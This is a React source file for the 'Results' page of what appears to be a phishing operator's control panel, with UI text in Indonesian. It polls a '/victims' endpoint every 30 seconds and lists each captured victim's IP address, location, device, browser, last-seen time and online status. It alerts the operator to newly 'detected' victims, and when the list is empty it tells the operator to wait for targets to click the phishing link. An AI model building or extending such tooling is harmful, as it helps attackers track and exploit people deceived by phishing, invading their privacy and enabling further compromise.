import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaEye, FaDesktop, FaMobile, FaSearch, FaBell } from 'react-icons/fa';
import Navbar from '../components/Navbar';
import Sidebar from '../components/Sidebar';
import api from '../api/axios';
import toast from 'react-hot-toast';

const Results = () => {
  const [victims, setVictims] = useState([]);
  const [filteredVictims, setFilteredVictims] = useState([]);
  const [search, setSearch] = useState('');
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    fetchVictims();
    const interval = setInterval(fetchVictims, 30000);
    return () => clearInterval(interval);
  }, []);

  const fetchVictims = async () => {
    try {
      const res = await api.get('/victims');
      setVictims(res.data);
      setFilteredVictims(res.data);
      if (res.data.length > 0) {
        toast.success(`${res.data.length} victim terdeteksi!`, { icon: '🔔' });
      }
    } catch (err) {
      toast.error('Gagal ambil data victim');
    } finally {
      setLoading(false);
    }
  };

  const handleSearch = (e) => {
    const query = e.target.value.toLowerCase();
    setSearch(query);
    if (query === '') {
      setFilteredVictims(victims);
    } else {
      setFilteredVictims(
        victims.filter((v) =>
          v.ip.includes(query) || v.device.toLowerCase().includes(query)
        )
      );
    }
  };

  const handleViewVictim = (victimId) => {
    navigate(`/victim/${victimId}`);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-primary flex items-center justify-center">
        <div className="text-accent text-xl animate-pulse">Loading...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-primary flex">
      <Sidebar />
      <div className="flex-1">
        <Navbar />
        <main className="p-6">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-2xl font-bold glow-text">Results</h2>
              <div className="flex items-center gap-4">
                <div className="relative">
                  <FaSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
                  <input
                    type="text"
                    value={search}
                    onChange={handleSearch}
                    placeholder="Cari IP atau device..."
                    className="bg-dark/50 border border-accent/20 rounded-lg pl-10 pr-4 py-2 text-white focus:outline-none focus:border-accent"
                  />
                </div>
                <span className="text-sm text-gray-400">
                  Total: {filteredVictims.length} victim
                </span>
              </div>
            </div>

            <div className="glass-effect rounded-xl p-6 glow-border">
              {filteredVictims.length === 0 ? (
                <div className="text-center py-12 text-gray-500">
                  <FaBell className="text-4xl mx-auto mb-3 opacity-50" />
                  <p>Belum ada victim terdeteksi</p>
                  <p className="text-sm">Tunggu target mengklik link phising</p>
                </div>
              ) : (
                <div className="space-y-3">
                  {filteredVictims.map((victim, index) => (
                    <motion.div
                      key={index}
                      initial={{ opacity: 0, x: -20 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ delay: index * 0.05 }}
                      className="flex items-center justify-between p-4 bg-dark/30 rounded-lg hover:bg-dark/50 transition cursor-pointer border border-accent/5 hover:border-accent/20"
                      onClick={() => handleViewVictim(victim.id)}
                    >
                      <div className="flex items-center gap-4">
                        <div className="text-2xl">
                          {victim.device?.toLowerCase().includes('mobile') ||
                          victim.device?.toLowerCase().includes('android') ||
                          victim.device?.toLowerCase().includes('ios') ? (
                            <FaMobile className="text-blue-400" />
                          ) : (
                            <FaDesktop className="text-cyber" />
                          )}
                        </div>
                        <div>
                          <div className="flex items-center gap-3">
                            <span className="font-mono text-accent">{victim.ip}</span>
                            <span className="text-xs text-gray-500">{victim.location}</span>
                          </div>
                          <div className="text-sm text-gray-400">
                            {victim.device} • {victim.browser}
                          </div>
                          <div className="text-xs text-gray-600">
                            Last seen: {new Date(victim.lastSeen).toLocaleString()}
                          </div>
                        </div>
                      </div>
                      <div className="flex items-center gap-3">
                        <span className={`text-xs px-2 py-1 rounded ${
                          victim.status === 'online' ? 'bg-cyber/20 text-cyber' : 'bg-gray-700 text-gray-400'
                        }`}>
                          {victim.status || 'offline'}
                        </span>
                        <button className="text-accent hover:text-glow transition">
                          <FaEye size={18} />
                        </button>
                      </div>
                    </motion.div>
                  ))}
                </div>
              )}
            </div>
          </motion.div>
        </main>
      </div>
    </div>
  );
};

export default Results;
